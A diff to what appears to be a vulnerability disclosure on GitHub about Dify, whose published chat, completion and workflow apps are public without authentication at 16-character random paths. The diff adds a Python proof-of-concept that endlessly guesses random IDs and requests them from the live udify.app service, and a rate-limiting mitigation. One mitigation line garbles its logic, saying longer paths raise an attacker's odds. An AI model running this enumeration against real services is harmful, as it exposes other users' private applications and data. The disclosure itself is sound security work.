@@ -20,6 +20,37 @@ As can be seen from the screenshot, no authorization information is required to 
 According to the official documentation(https://docs.dify.ai/guides/application-publishing/launch-your-webapp-quickly), the API generated here will be published publicly on the internet even if it is released, and there is no place to set authentication on the page.
 ![image](https://github.com/happy0717/dify_api_-completion-chat-workflow-_Public_interface_traversable/blob/main/img/Snipaste_2025-03-12_18-00-24.png)
 In addition, there is no prompt to users on the model application creation page, and there is no clear indication that the created model application will be public. It turns out that most users do not know that the newly created model application is public.
+
+POC python
+```import random
+import requests
+
+ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
+ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+ascii_letters = ascii_lowercase + ascii_uppercase
+digits = '0123456789'
+
+while True:
+    letters_digits = ascii_letters + digits
+    result = ""
+    for i in range(16):
+        result += random.choice(letters_digits)
+
+    url = f"https://udify.app/chat/{result}"
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
+        'Accept': '*/*',
+        'Sec-Fetch-Site': 'cross-site',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'zh-CN,zh;q=0.9'
+    }
+
+    response = requests.get(url, headers=headers)
+    print(response.text)
+        
+
+```
 # Risk Description
 
 The risk here can correspond to OWASP Top 10 API Security Risks – 2023：
@@ -43,3 +74,4 @@ In the Dify code api\events\event_handlers\create_site_record_when_app_created.p
 1.Increasing the length of the random path of the model application API, such as 64 or 128 bits, can increase the possibility of successful brute force guessing by malicious attackers.
 2.Added an authentication switch for the [completion/chat/workflow] interface on the page, allowing users to choose whether to publicly release the model application
 3.Remind users on the page that newly created model applications will be made public
+4.Limiting API requests to [completion/chat/workflow] 
